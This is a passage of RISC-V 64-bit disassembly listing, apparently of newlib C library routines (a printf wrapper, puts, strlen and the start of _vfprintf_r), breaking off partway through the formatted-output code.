   10800:	711d                	addi	sp,sp,-96
   10802:	f832                	sd	a2,48(sp)
   10804:	fc36                	sd	a3,56(sp)
   10806:	8501b303          	ld	t1,-1968(gp) # 1f5d8 <_impure_ptr>
   1080a:	f42e                	sd	a1,40(sp)
   1080c:	e0ba                	sd	a4,64(sp)
   1080e:	e4be                	sd	a5,72(sp)
   10810:	e8c2                	sd	a6,80(sp)
   10812:	ecc6                	sd	a7,88(sp)
   10814:	01033583          	ld	a1,16(t1) # 1016c <flushCache+0x6>
   10818:	1034                	addi	a3,sp,40
   1081a:	862a                	mv	a2,a0
   1081c:	851a                	mv	a0,t1
   1081e:	ec06                	sd	ra,24(sp)
   10820:	e436                	sd	a3,8(sp)
   10822:	126000ef          	jal	ra,10948 <_vfprintf_r>
   10826:	60e2                	ld	ra,24(sp)
   10828:	6125                	addi	sp,sp,96
   1082a:	8082                	ret

000000000001082c <_puts_r>:
   1082c:	7159                	addi	sp,sp,-112
   1082e:	f0a2                	sd	s0,96(sp)
   10830:	842a                	mv	s0,a0
   10832:	852e                	mv	a0,a1
   10834:	eca6                	sd	s1,88(sp)
   10836:	f486                	sd	ra,104(sp)
   10838:	84ae                	mv	s1,a1
   1083a:	07a000ef          	jal	ra,108b4 <strlen>
   1083e:	00150713          	addi	a4,a0,1
   10842:	0000c697          	auipc	a3,0xc
   10846:	e8668693          	addi	a3,a3,-378 # 1c6c8 <__clzdi2+0x174>
   1084a:	f43a                	sd	a4,40(sp)
   1084c:	483c                	lw	a5,80(s0)
   1084e:	1818                	addi	a4,sp,48
   10850:	e0b6                	sd	a3,64(sp)
   10852:	ec3a                	sd	a4,24(sp)
   10854:	4685                	li	a3,1
   10856:	4709                	li	a4,2
   10858:	f826                	sd	s1,48(sp)
   1085a:	fc2a                	sd	a0,56(sp)
   1085c:	e4b6                	sd	a3,72(sp)
   1085e:	d03a                	sw	a4,32(sp)
   10860:	680c                	ld	a1,16(s0)
   10862:	cf8d                	beqz	a5,1089c <_puts_r+0x70>
   10864:	01059783          	lh	a5,16(a1) # 4010 <register_fini-0xc0a0>
   10868:	03279713          	slli	a4,a5,0x32
   1086c:	00074d63          	bltz	a4,10886 <_puts_r+0x5a>
   10870:	0ac5a703          	lw	a4,172(a1)
   10874:	6689                	lui	a3,0x2
   10876:	8fd5                	or	a5,a5,a3
   10878:	76f9                	lui	a3,0xffffe
   1087a:	16fd                	addi	a3,a3,-1
   1087c:	8f75                	and	a4,a4,a3
   1087e:	00f59823          	sh	a5,16(a1)
   10882:	0ae5a623          	sw	a4,172(a1)
   10886:	0830                	addi	a2,sp,24
   10888:	8522                	mv	a0,s0
   1088a:	6dc020ef          	jal	ra,12f66 <__sfvwrite_r>
   1088e:	ed09                	bnez	a0,108a8 <_puts_r+0x7c>
   10890:	4529                	li	a0,10
   10892:	70a6                	ld	ra,104(sp)
   10894:	7406                	ld	s0,96(sp)
   10896:	64e6                	ld	s1,88(sp)
   10898:	6165                	addi	sp,sp,112
   1089a:	8082                	ret
   1089c:	8522                	mv	a0,s0
   1089e:	e42e                	sd	a1,8(sp)
   108a0:	344020ef          	jal	ra,12be4 <__sinit>
   108a4:	65a2                	ld	a1,8(sp)
   108a6:	bf7d                	j	10864 <_puts_r+0x38>
   108a8:	557d                	li	a0,-1
   108aa:	b7e5                	j	10892 <_puts_r+0x66>

00000000000108ac <puts>:
   108ac:	85aa                	mv	a1,a0
   108ae:	8501b503          	ld	a0,-1968(gp) # 1f5d8 <_impure_ptr>
   108b2:	bfad                	j	1082c <_puts_r>

00000000000108b4 <strlen>:
   108b4:	00757793          	andi	a5,a0,7
   108b8:	872a                	mv	a4,a0
   108ba:	ebb9                	bnez	a5,10910 <strlen+0x5c>
   108bc:	0000f697          	auipc	a3,0xf
   108c0:	ccc6b683          	ld	a3,-820(a3) # 1f588 <__SDATA_BEGIN__>
   108c4:	55fd                	li	a1,-1
   108c6:	6310                	ld	a2,0(a4)
   108c8:	0721                	addi	a4,a4,8
   108ca:	00d677b3          	and	a5,a2,a3
   108ce:	97b6                	add	a5,a5,a3
   108d0:	8fd1                	or	a5,a5,a2
   108d2:	8fd5                	or	a5,a5,a3
   108d4:	feb789e3          	beq	a5,a1,108c6 <strlen+0x12>
   108d8:	ff874683          	lbu	a3,-8(a4)
   108dc:	40a707b3          	sub	a5,a4,a0
   108e0:	c6a9                	beqz	a3,1092a <strlen+0x76>
   108e2:	ff974683          	lbu	a3,-7(a4)
   108e6:	ce9d                	beqz	a3,10924 <strlen+0x70>
   108e8:	ffa74683          	lbu	a3,-6(a4)
   108ec:	c6a9                	beqz	a3,10936 <strlen+0x82>
   108ee:	ffb74683          	lbu	a3,-5(a4)
   108f2:	ce9d                	beqz	a3,10930 <strlen+0x7c>
   108f4:	ffc74683          	lbu	a3,-4(a4)
   108f8:	ffd74603          	lbu	a2,-3(a4)
   108fc:	ffe74503          	lbu	a0,-2(a4)
   10900:	ce95                	beqz	a3,1093c <strlen+0x88>
   10902:	c221                	beqz	a2,10942 <strlen+0x8e>
   10904:	00a03533          	snez	a0,a0
   10908:	953e                	add	a0,a0,a5
   1090a:	1579                	addi	a0,a0,-2
   1090c:	8082                	ret
   1090e:	d6dd                	beqz	a3,108bc <strlen+0x8>
   10910:	00074783          	lbu	a5,0(a4)
   10914:	0705                	addi	a4,a4,1
   10916:	00777693          	andi	a3,a4,7
   1091a:	fbf5                	bnez	a5,1090e <strlen+0x5a>
   1091c:	8f09                	sub	a4,a4,a0
   1091e:	fff70513          	addi	a0,a4,-1
   10922:	8082                	ret
   10924:	ff978513          	addi	a0,a5,-7
   10928:	8082                	ret
   1092a:	ff878513          	addi	a0,a5,-8
   1092e:	8082                	ret
   10930:	ffb78513          	addi	a0,a5,-5
   10934:	8082                	ret
   10936:	ffa78513          	addi	a0,a5,-6
   1093a:	8082                	ret
   1093c:	ffc78513          	addi	a0,a5,-4
   10940:	8082                	ret
   10942:	ffd78513          	addi	a0,a5,-3
   10946:	8082                	ret

0000000000010948 <_vfprintf_r>:
   10948:	d8010113          	addi	sp,sp,-640
   1094c:	26113c23          	sd	ra,632(sp)
   10950:	25413823          	sd	s4,592(sp)
   10954:	25513423          	sd	s5,584(sp)
   10958:	23913423          	sd	s9,552(sp)
   1095c:	8a2e                	mv	s4,a1
   1095e:	8cb2                	mv	s9,a2
   10960:	e836                	sd	a3,16(sp)
   10962:	26813823          	sd	s0,624(sp)
   10966:	26913423          	sd	s1,616(sp)
   1096a:	27213023          	sd	s2,608(sp)
   1096e:	25313c23          	sd	s3,600(sp)
   10972:	25613023          	sd	s6,576(sp)
   10976:	23713c23          	sd	s7,568(sp)
   1097a:	23813823          	sd	s8,560(sp)
   1097e:	23a13023          	sd	s10,544(sp)
   10982:	21b13c23          	sd	s11,536(sp)
   10986:	8aaa                	mv	s5,a0
   10988:	2c5040ef          	jal	ra,1544c <_localeconv_r>
   1098c:	611c                	ld	a5,0(a0)
   1098e:	853e                	mv	a0,a5
   10990:	fcbe                	sd	a5,120(sp)
   10992:	f23ff0ef          	jal	ra,108b4 <strlen>
   10996:	f8aa                	sd	a0,112(sp)
   10998:	e202                	sd	zero,256(sp)
   1099a:	e602                	sd	zero,264(sp)
   1099c:	000a8663          	beqz	s5,109a8 <_vfprintf_r+0x60>
   109a0:	050aa783          	lw	a5,80(s5)
   109a4:	70078063          	beqz	a5,110a4 <_vfprintf_r+0x75c>
   109a8:	010a1703          	lh	a4,16(s4)
   109ac:	03071793          	slli	a5,a4,0x30
   109b0:	03271693          	slli	a3,a4,0x32
   109b4:	93c1                	srli	a5,a5,0x30
   109b6:	0006cf63          	bltz	a3,109d4 <_vfprintf_r+0x8c>
   109ba:	0aca2683          	lw	a3,172(s4)
   109be:	6789                	lui	a5,0x2
   109c0:	8fd9                	or	a5,a5,a4
   109c2:	7779                	lui	a4,0xffffe
   109c4:	177d                	addi	a4,a4,-1
   109c6:	8f75                	and	a4,a4,a3
   109c8:	00fa1823          	sh	a5,16(s4)
   109cc:	17c2                	slli	a5,a5,0x30
   109ce:	0aea2623          	sw	a4,172(s4)
   109d2:	93c1                	srli	a5,a5,0x30
   109d4:	0087f713          	andi	a4,a5,8
   109d8:	26070463          	beqz	a4,10c40 <_vfprintf_r+0x2f8>
   109dc:	018a3703          	ld	a4,24(s4)
   109e0:	26070063          	beqz	a4,10c40 <_vfprintf_r+0x2f8>
   109e4:	8be9                	andi	a5,a5,26
   109e6:	4729                	li	a4,10
   109e8:	26e78963          	beq	a5,a4,10c5a <_vfprintf_r+0x312>
   109ec:	000cc783          	lbu	a5,0(s9)
   109f0:	19010b93          	addi	s7,sp,400
   109f4:	ea5e                	sd	s7,272(sp)
   109f6:	f202                	sd	zero,288(sp)
   109f8:	10012c23          	sw	zero,280(sp)
   109fc:	f002                	sd	zero,32(sp)
   109fe:	f402                	sd	zero,40(sp)
   10a00:	e102                	sd	zero,128(sp)
   10a02:	f482                	sd	zero,104(sp)
   10a04:	e502                	sd	zero,136(sp)
   10a06:	e902                	sd	zero,144(sp)
   10a08:	e002                	sd	zero,0(sp)
   10a0a:	835e                	mv	t1,s7
   10a0c:	4d41                	li	s10,16
   10a0e:	0000c917          	auipc	s2,0xc
   10a12:	ea290913          	addi	s2,s2,-350 # 1c8b0 <zeroes.4521>
   10a16:	1c078663          	beqz	a5,10be2 <_vfprintf_r+0x29a>
   10a1a:	8466                	mv	s0,s9
   10a1c:	02500713          	li	a4,37
   10a20:	30e78463          	beq	a5,a4,10d28 <_vfprintf_r+0x3e0>
   10a24:	00144783          	lbu	a5,1(s0)
   10a28:	0405                	addi	s0,s0,1
   10a2a:	fbfd                	bnez	a5,10a20 <_vfprintf_r+0xd8>
   10a2c:	419404bb          	subw	s1,s0,s9
   10a30:	1a048963          	beqz	s1,10be2 <_vfprintf_r+0x29a>
   10a34:	7712                	ld	a4,288(sp)
   10a36:	11812783          	lw	a5,280(sp)
   10a3a:	01933023          	sd	s9,0(t1)
   10a3e:	9726                	add	a4,a4,s1
   10a40:	2785                	addiw	a5,a5,1
   10a42:	00933423          	sd	s1,8(t1)
   10a46:	f23a                	sd	a4,288(sp)
   10a48:	10f12c23          	sw	a5,280(sp)
   10a4c:	0007871b          	sext.w	a4,a5
   10a50:	479d                	li	a5,7
   10a52:	0341                	addi	t1,t1,16
   10a54:	2ee7c163          	blt	a5,a4,10d36 <_vfprintf_r+0x3ee>
   10a58:	6702                	ld	a4,0(sp)
   10a5a:	00044783          	lbu	a5,0(s0)
   10a5e:	9f25                	addw	a4,a4,s1
   10a60:	e03a                	sd	a4,0(sp)
   10a62:	18078063          	beqz	a5,10be2 <_vfprintf_r+0x29a>
   10a66:	00144f03          	lbu	t5,1(s0)
   10a6a:	0c010fa3          	sb	zero,223(sp)
   10a6e:	0405                	addi	s0,s0,1
   10a70:	5efd                	li	t4,-1
   10a72:	4b01                	li	s6,0
   10a74:	4481                	li	s1,0
   10a76:	49a5                	li	s3,9
   10a78:	02a00c13          	li	s8,42
   10a7c:	0405                	addi	s0,s0,1
   10a7e:	000f0d9b          	sext.w	s11,t5
   10a82:	05a00693          	li	a3,90
   10a86:	fe0d879b          	addiw	a5,s11,-32
   10a8a:	0007871b          	sext.w	a4,a5
   10a8e:	04e6e663          	bltu	a3,a4,10ada <_vfprintf_r+0x192>
   10a92:	1782                	slli	a5,a5,0x20
   10a94:	0000c717          	auipc	a4,0xc
   10a98:	c9c70713          	addi	a4,a4,-868 # 1c730 <__clzdi2+0x1dc>
   10a9c:	83f9                	srli	a5,a5,0x1e
   10a9e:	97ba                	add	a5,a5,a4
   10aa0:	439c                	lw	a5,0(a5)
   10aa2:	97ba                	add	a5,a5,a4
   10aa4:	8782                	jr	a5
   10aa6:	4b01                	li	s6,0
   10aa8:	00044703          	lbu	a4,0(s0)
   10aac:	002b179b          	slliw	a5,s6,0x2
   10ab0:	01678b3b          	addw	s6,a5,s6
   10ab4:	fd0d8f1b          	addiw	t5,s11,-48
   10ab8:	001b1b1b          	slliw	s6,s6,0x1
   10abc:	fd07079b          	addiw	a5,a4,-48
   10ac0:	0405                	addi	s0,s0,1
   10ac2:	016f0b3b          	addw	s6,t5,s6
   10ac6:	00070d9b          	sext.w	s11,a4
   10aca:	fcf9ffe3          	bgeu	s3,a5,10aa8 <_vfprintf_r+0x160>
   10ace:	fe0d879b          	addiw	a5,s11,-32
   10ad2:	0007871b          	sext.w	a4,a5
   10ad6:	fae6fee3          	bgeu	a3,a4,10a92 <_vfprintf_r+0x14a>
   10ada:	100d8463          	beqz	s11,10be2 <_vfprintf_r+0x29a>
   10ade:	13b10423          	sb	s11,296(sp)
   10ae2:	0c010fa3          	sb	zero,223(sp)
   10ae6:	4985                	li	s3,1
   10ae8:	4c05                	li	s8,1
   10aea:	12810c93          	addi	s9,sp,296
   10aee:	ec02                	sd	zero,24(sp)
   10af0:	4e81                	li	t4,0
   10af2:	e882                	sd	zero,80(sp)
   10af4:	f082                	sd	zero,96(sp)
   10af6:	ec82                	sd	zero,88(sp)
   10af8:	0024f793          	andi	a5,s1,2
   10afc:	0007829b          	sext.w	t0,a5
   10b00:	c391                	beqz	a5,10b04 <_vfprintf_r+0x1bc>
   10b02:	2989                	addiw	s3,s3,2
   10b04:	0844ff93          	andi	t6,s1,132
   10b08:	7792                	ld	a5,288(sp)
   10b0a:	000f9663          	bnez	t6,10b16 <_vfprintf_r+0x1ce>
   10b0e:	413b06bb          	subw	a3,s6,s3
   10b12:	2cd046e3          	bgtz	a3,115de <_vfprintf_r+0xc96>
   10b16:	0df14703          	lbu	a4,223(sp)
   10b1a:	c70d                	beqz	a4,10b44 <_vfprintf_r+0x1fc>
   10b1c:	11812703          	lw	a4,280(sp)
   10b20:	0df10693          	addi	a3,sp,223
   10b24:	00d33023          	sd	a3,0(t1)
   10b28:	2705                	addiw	a4,a4,1
   10b2a:	4685                	li	a3,1
   10b2c:	0785                	addi	a5,a5,1
   10b2e:	00d33423          	sd	a3,8(t1)
   10b32:	10e12c23          	sw	a4,280(sp)
   10b36:	0007069b          	sext.w	a3,a4
   10b3a:	f23e                	sd	a5,288(sp)
   10b3c:	471d                	li	a4,7
   10b3e:	0341                	addi	t1,t1,16
   10b40:	42d74863          	blt	a4,a3,10f70 <_vfprintf_r+0x628>
   10b44:	02028563          	beqz	t0,10b6e <_vfprintf_r+0x226>
   10b48:	11812703          	lw	a4,280(sp)
   10b4c:	1194                	addi	a3,sp,224
   10b4e:	00d33023          	sd	a3,0(t1)
   10b52:	2705                	addiw	a4,a4,1
   10b54:	4689                	li	a3,2
   10b56:	0789                	addi	a5,a5,2
   10b58:	00d33423          	sd	a3,8(t1)
   10b5c:	10e12c23          	sw	a4,280(sp)
   10b60:	0007069b          	sext.w	a3,a4
   10b64:	f23e                	sd	a5,288(sp)
   10b66:	471d                	li	a4,7
   10b68:	0341                	addi	t1,t1,16
   10b6a:	30d74ce3          	blt	a4,a3,11682 <_vfprintf_r+0xd3a>
   10b6e:	08000713          	li	a4,128
   10b72:	06ef81e3          	beq	t6,a4,113d4 <_vfprintf_r+0xa8c>
   10b76:	418e8ebb          	subw	t4,t4,s8
   10b7a:	0fd043e3          	bgtz	t4,11460 <_vfprintf_r+0xb18>
   10b7e:	1004f713          	andi	a4,s1,256
   10b82:	78071663          	bnez	a4,1130e <_vfprintf_r+0x9c6>
   10b86:	11812703          	lw	a4,280(sp)
   10b8a:	97e2                	add	a5,a5,s8
   10b8c:	01933023          	sd	s9,0(t1)
   10b90:	0017069b          	addiw	a3,a4,1
   10b94:	8736                	mv	a4,a3
   10b96:	01833423          	sd	s8,8(t1)
   10b9a:	10e12c23          	sw	a4,280(sp)
   10b9e:	f23e                	sd	a5,288(sp)
   10ba0:	471d                	li	a4,7
   10ba2:	44d74963          	blt	a4,a3,10ff4 <_vfprintf_r+0x6ac>
   10ba6:	0341                	addi	t1,t1,16
   10ba8:	8891                	andi	s1,s1,4
   10baa:	c489                	beqz	s1,10bb4 <_vfprintf_r+0x26c>
   10bac:	413b04bb          	subw	s1,s6,s3
   10bb0:	2e9048e3          	bgtz	s1,116a0 <_vfprintf_r+0xd58>
   10bb4:	875a                	mv	a4,s6
   10bb6:	013b5363          	bge	s6,s3,10bbc <_vfprintf_r+0x274>
   10bba:	874e                	mv	a4,s3
   10bbc:	6682                	ld	a3,0(sp)
   10bbe:	9f35                	addw	a4,a4,a3
   10bc0:	e03a                	sd	a4,0(sp)
   10bc2:	10079ce3          	bnez	a5,114da <_vfprintf_r+0xb92>
   10bc6:	67e2                	ld	a5,24(sp)
   10bc8:	10012c23          	sw	zero,280(sp)
   10bcc:	c789                	beqz	a5,10bd6 <_vfprintf_r+0x28e>
   10bce:	65e2                	ld	a1,24(sp)
   10bd0:	8556                	mv	a0,s5
   10bd2:	144020ef          	jal	ra,12d16 <_free_r>
   10bd6:	835e                	mv	t1,s7
   10bd8:	8ca2                	mv	s9,s0
   10bda:	000cc783          	lbu	a5,0(s9)
   10bde:	e2079ee3          	bnez	a5,10a1a <_vfprintf_r+0xd2>
   10be2:	7792                	ld	a5,288(sp)
   10be4:	c399                	beqz	a5,10bea <_vfprintf_r+0x2a2>
   10be6:	2de0106f          	j	11ec4 <_vfprintf_r+0x157c>
   10bea:	010a5783          	lhu	a5,16(s4)
   10bee:	0407f793          	andi	a5,a5,64
   10bf2:	c399                	beqz	a5,10bf8 <_vfprintf_r+0x2b0>
   10bf4:	67c0106f          	j	12270 <_vfprintf_r+0x1928>
   10bf8:	27813083          	ld	ra,632(sp)
   10bfc:	27013403          	ld	s0,624(sp)
   10c00:	6502                	ld	a0,0(sp)
   10c02:	26813483          	ld	s1,616(sp)
   10c06:	26013903          	ld	s2,608(sp)
   10c0a:	25813983          	ld	s3,600(sp)
   10c0e:	25013a03          	ld	s4,592(sp)
   10c12:	24813a83          	ld	s5,584(sp)
   10c16:	24013b03          	ld	s6,576(sp)
   10c1a:	23813b83          	ld	s7,568(sp)
   10c1e:	23013c03          	ld	s8,560(sp)
   10c22:	22813c83          	ld	s9,552(sp)
   10c26:	22013d03          	ld	s10,544(sp)
   10c2a:	21813d83          	ld	s11,536(sp)
   10c2e:	28010113          	addi	sp,sp,640
   10c32:	8082                	ret
   10c34:	0104e493          	ori	s1,s1,16
   10c38:	00044f03          	lbu	t5,0(s0)
   10c3c:	2481                	sext.w	s1,s1
   10c3e:	bd3d                	j	10a7c <_vfprintf_r+0x134>
   10c40:	85d2                	mv	a1,s4
   10c42:	8556                	mv	a0,s5
   10c44:	1c1010ef          	jal	ra,12604 <__swsetup_r>
   10c48:	c119                	beqz	a0,10c4e <_vfprintf_r+0x306>
   10c4a:	6260106f          	j	12270 <_vfprintf_r+0x1928>
   10c4e:	010a5783          	lhu	a5,16(s4)
   10c52:	4729                	li	a4,10
   10c54:	8be9                	andi	a5,a5,26
   10c56:	d8e79be3          	bne	a5,a4,109ec <_vfprintf_r+0xa4>
   10c5a:	012a1783          	lh	a5,18(s4)
   10c5e:	d807c7e3          	bltz	a5,109ec <_vfprintf_r+0xa4>
   10c62:	66c2                	ld	a3,16(sp)
   10c64:	8666                	mv	a2,s9
   10c66:	85d2                	mv	a1,s4
   10c68:	8556                	mv	a0,s5
   10c6a:	107010ef          	jal	ra,12570 <__sbprintf>
   10c6e:	e02a                	sd	a0,0(sp)
   10c70:	b761                	j	10bf8 <_vfprintf_r+0x2b0>
   10c72:	0104e493          	ori	s1,s1,16
   10c76:	2481                	sext.w	s1,s1
   10c78:	66c2                	ld	a3,16(sp)
   10c7a:	0204f793          	andi	a5,s1,32
   10c7e:	00868713          	addi	a4,a3,8
   10c82:	3a078263          	beqz	a5,11026 <_vfprintf_r+0x6de>
   10c86:	629c                	ld	a5,0(a3)
   10c88:	89be                	mv	s3,a5
   10c8a:	3a07cc63          	bltz	a5,11042 <_vfprintf_r+0x6fa>
   10c8e:	57fd                	li	a5,-1
   10c90:	48fe87e3          	beq	t4,a5,1191e <_vfprintf_r+0xfd6>
   10c94:	f7f4f493          	andi	s1,s1,-129
   10c98:	e83a                	sd	a4,16(sp)
   10c9a:	0004881b          	sext.w	a6,s1
   10c9e:	120993e3          	bnez	s3,115c4 <_vfprintf_r+0xc7c>
   10ca2:	120e94e3          	bnez	t4,115ca <_vfprintf_r+0xc82>
   10ca6:	84c2                	mv	s1,a6
   10ca8:	4e81                	li	t4,0
   10caa:	4c01                	li	s8,0
   10cac:	18c10c93          	addi	s9,sp,396
   10cb0:	000c099b          	sext.w	s3,s8
   10cb4:	01dc5463          	bge	s8,t4,10cbc <_vfprintf_r+0x374>
   10cb8:	000e899b          	sext.w	s3,t4
   10cbc:	0df14783          	lbu	a5,223(sp)
   10cc0:	ec02                	sd	zero,24(sp)
   10cc2:	e882                	sd	zero,80(sp)
   10cc4:	f082                	sd	zero,96(sp)
   10cc6:	ec82                	sd	zero,88(sp)
   10cc8:	e20788e3          	beqz	a5,10af8 <_vfprintf_r+0x1b0>
   10ccc:	2985                	addiw	s3,s3,1
   10cce:	b52d                	j	10af8 <_vfprintf_r+0x1b0>
   10cd0:	0104e493          	ori	s1,s1,16
   10cd4:	2481                	sext.w	s1,s1
   10cd6:	66c2                	ld	a3,16(sp)
   10cd8:	0204f793          	andi	a5,s1,32
   10cdc:	00868713          	addi	a4,a3,8
   10ce0:	32078463          	beqz	a5,11008 <_vfprintf_r+0x6c0>
   10ce4:	0006b983          	ld	s3,0(a3)
   10ce8:	bff4f493          	andi	s1,s1,-1025
   10cec:	0004881b          	sext.w	a6,s1
   10cf0:	e83a                	sd	a4,16(sp)
   10cf2:	4781                	li	a5,0
   10cf4:	0c010fa3          	sb	zero,223(sp)
   10cf8:	577d                	li	a4,-1
   10cfa:	36ee8063          	beq	t4,a4,1105a <_vfprintf_r+0x712>
   10cfe:	f7f87493          	andi	s1,a6,-129
   10d02:	2481                	sext.w	s1,s1
   10d04:	0a099ce3          	bnez	s3,115bc <_vfprintf_r+0xc74>
   10d08:	5c0e9663          	bnez	t4,112d4 <_vfprintf_r+0x98c>
   10d0c:	ffd1                	bnez	a5,10ca8 <_vfprintf_r+0x360>
   10d0e:	00187c13          	andi	s8,a6,1
   10d12:	18c10c93          	addi	s9,sp,396
   10d16:	f80c0de3          	beqz	s8,10cb0 <_vfprintf_r+0x368>
   10d1a:	03000793          	li	a5,48
   10d1e:	18f105a3          	sb	a5,395(sp)
   10d22:	18b10c93          	addi	s9,sp,395
   10d26:	b769                	j	10cb0 <_vfprintf_r+0x368>
   10d28:	419404bb          	subw	s1,s0,s9
   10d2c:	d00494e3          	bnez	s1,10a34 <_vfprintf_r+0xec>
   10d30:	00044783          	lbu	a5,0(s0)
   10d34:	b33d                	j	10a62 <_vfprintf_r+0x11a>
   10d36:	0a10                	addi	a2,sp,272
   10d38:	85d2                	mv	a1,s4
   10d3a:	8556                	mv	a0,s5
   10d3c:	1ca080ef          	jal	ra,18f06 <__sprint_r>
   10d40:	ea0515e3          	bnez	a0,10bea <_vfprintf_r+0x2a2>
   10d44:	835e                	mv	t1,s7
   10d46:	bb09                	j	10a58 <_vfprintf_r+0x110>
   10d48:	0084f793          	andi	a5,s1,8
   10d4c:	3a079ee3          	bnez	a5,11908 <_vfprintf_r+0xfc0>
   10d50:	67c2                	ld	a5,16(sp)
   10d52:	ec1a                	sd	t1,24(sp)
   10d54:	e476                	sd	t4,8(sp)
   10d56:	2388                	fld	fa0,0(a5)
   10d58:	00878693          	addi	a3,a5,8 # 2008 <register_fini-0xe0a8>
   10d5c:	e836                	sd	a3,16(sp)
   10d5e:	5040b0ef          	jal	ra,1c262 <__extenddftf2>
   10d62:	6362                	ld	t1,24(sp)
   10d64:	6ea2                	ld	t4,8(sp)
   10d66:	e22a                	sd	a0,256(sp)
   10d68:	e62e                	sd	a1,264(sp)
   10d6a:	0208                	addi	a0,sp,256
   10d6c:	ec1a                	sd	t1,24(sp)
   10d6e:	e476                	sd	t4,8(sp)
   10d70:	6a0040ef          	jal	ra,15410 <_ldcheck>
   10d74:	d5aa                	sw	a0,232(sp)
   10d76:	4789                	li	a5,2
   10d78:	6ea2                	ld	t4,8(sp)
   10d7a:	6362                	ld	t1,24(sp)
   10d7c:	64f502e3          	beq	a0,a5,11bc0 <_vfprintf_r+0x1278>
   10d80:	4785                	li	a5,1
   10d82:	6ef50ee3          	beq	a0,a5,11c7e <_vfprintf_r+0x1336>
   10d86:	06100793          	li	a5,97
   10d8a:	00fd9463          	bne	s11,a5,10d92 <_vfprintf_r+0x44a>
   10d8e:	5740106f          	j	12302 <_vfprintf_r+0x19ba>
   10d92:	04100793          	li	a5,65
   10d96:	00fd9463          	bne	s11,a5,10d9e <_vfprintf_r+0x456>
   10d9a:	1380106f          	j	11ed2 <_vfprintf_r+0x158a>
   10d9e:	fdfdf713          	andi	a4,s11,-33
   10da2:	57fd                	li	a5,-1
   10da4:	f0ba                	sd	a4,96(sp)
   10da6:	00fe9463          	bne	t4,a5,10dae <_vfprintf_r+0x466>
   10daa:	6140106f          	j	123be <_vfprintf_r+0x1a76>
   10dae:	04700793          	li	a5,71
   10db2:	00f71463          	bne	a4,a5,10dba <_vfprintf_r+0x472>
   10db6:	5c40106f          	j	1237a <_vfprintf_r+0x1a32>
   10dba:	69b2                	ld	s3,264(sp)
   10dbc:	1004e793          	ori	a5,s1,256
   10dc0:	ed26                	sd	s1,152(sp)
   10dc2:	6c12                	ld	s8,256(sp)
   10dc4:	2781                	sext.w	a5,a5
   10dc6:	0009d463          	bgez	s3,10dce <_vfprintf_r+0x486>
   10dca:	67a0106f          	j	12444 <_vfprintf_r+0x1afc>
   10dce:	e582                	sd	zero,200(sp)
   10dd0:	84be                	mv	s1,a5
   10dd2:	ec02                	sd	zero,24(sp)
   10dd4:	2701                	sext.w	a4,a4
   10dd6:	04600793          	li	a5,70
   10dda:	00f71463          	bne	a4,a5,10de2 <_vfprintf_r+0x49a>
   10dde:	38a0106f          	j	12168 <_vfprintf_r+0x1820>
   10de2:	7706                	ld	a4,96(sp)
   10de4:	04500793          	li	a5,69
   10de8:	00f70463          	beq	a4,a5,10df0 <_vfprintf_r+0x4a8>
   10dec:	33c0106f          	j	12128 <_vfprintf_r+0x17e0>
   10df0:	001e871b          	addiw	a4,t4,1
   10df4:	0f810893          	addi	a7,sp,248
   10df8:	0ec10813          	addi	a6,sp,236
   10dfc:	11bc                	addi	a5,sp,232
   10dfe:	4689                	li	a3,2
   10e00:	85e2                	mv	a1,s8
   10e02:	864e                	mv	a2,s3
   10e04:	8556                	mv	a0,s5
   10e06:	f81a                	sd	t1,48(sp)
   10e08:	f076                	sd	t4,32(sp)
   10e0a:	e43a                	sd	a4,8(sp)
   10e0c:	78c030ef          	jal	ra,14598 <_ldtoa_r>
   10e10:	6722                	ld	a4,8(sp)
   10e12:	7e82                	ld	t4,32(sp)
   10e14:	7342                	ld	t1,48(sp)
   10e16:	8caa                	mv	s9,a0
   10e18:	00e508b3          	add	a7,a0,a4
   10e1c:	4601                	li	a2,0
   10e1e:	4681                	li	a3,0
   10e20:	8562                	mv	a0,s8
   10e22:	85ce                	mv	a1,s3
   10e24:	f846                	sd	a7,48(sp)
   10e26:	f01a                	sd	t1,32(sp)
   10e28:	e476                	sd	t4,8(sp)
   10e2a:	3540a0ef          	jal	ra,1b17e <__eqtf2>
   10e2e:	78c2                	ld	a7,48(sp)
   10e30:	6ea2                	ld	t4,8(sp)
   10e32:	7302                	ld	t1,32(sp)
   10e34:	87c6                	mv	a5,a7
   10e36:	cd11                	beqz	a0,10e52 <_vfprintf_r+0x50a>
   10e38:	77ee                	ld	a5,248(sp)
   10e3a:	0117fc63          	bgeu	a5,a7,10e52 <_vfprintf_r+0x50a>
   10e3e:	03000693          	li	a3,48
   10e42:	00178713          	addi	a4,a5,1
   10e46:	fdba                	sd	a4,248(sp)
   10e48:	00d78023          	sb	a3,0(a5)
   10e4c:	77ee                	ld	a5,248(sp)
   10e4e:	ff17eae3          	bltu	a5,a7,10e42 <_vfprintf_r+0x4fa>
   10e52:	419787bb          	subw	a5,a5,s9
   10e56:	f03e                	sd	a5,32(sp)
   10e58:	572e                	lw	a4,232(sp)
   10e5a:	04700793          	li	a5,71
   10e5e:	ecba                	sd	a4,88(sp)
   10e60:	7706                	ld	a4,96(sp)
   10e62:	00f71463          	bne	a4,a5,10e6a <_vfprintf_r+0x522>
   10e66:	2200106f          	j	12086 <_vfprintf_r+0x173e>
   10e6a:	7706                	ld	a4,96(sp)
   10e6c:	04600793          	li	a5,70
   10e70:	00f71463          	bne	a4,a5,10e78 <_vfprintf_r+0x530>
   10e74:	3c40106f          	j	12238 <_vfprintf_r+0x18f0>
   10e78:	67e6                	ld	a5,88(sp)
   10e7a:	7586                	ld	a1,96(sp)
   10e7c:	04100613          	li	a2,65
   10e80:	37fd                	addiw	a5,a5,-1
   10e82:	d5be                	sw	a5,232(sp)
   10e84:	0ffdf713          	andi	a4,s11,255
   10e88:	4681                	li	a3,0
   10e8a:	00c59663          	bne	a1,a2,10e96 <_vfprintf_r+0x54e>
   10e8e:	273d                	addiw	a4,a4,15
   10e90:	0ff77713          	andi	a4,a4,255
   10e94:	4685                	li	a3,1
   10e96:	0ee10823          	sb	a4,240(sp)
   10e9a:	02b00713          	li	a4,43
   10e9e:	0007d763          	bgez	a5,10eac <_vfprintf_r+0x564>
   10ea2:	6766                	ld	a4,88(sp)
   10ea4:	4785                	li	a5,1
   10ea6:	9f99                	subw	a5,a5,a4
   10ea8:	02d00713          	li	a4,45
   10eac:	0ee108a3          	sb	a4,241(sp)
   10eb0:	4725                	li	a4,9
   10eb2:	00f74463          	blt	a4,a5,10eba <_vfprintf_r+0x572>
   10eb6:	5e00106f          	j	12496 <_vfprintf_r+0x1b4e>
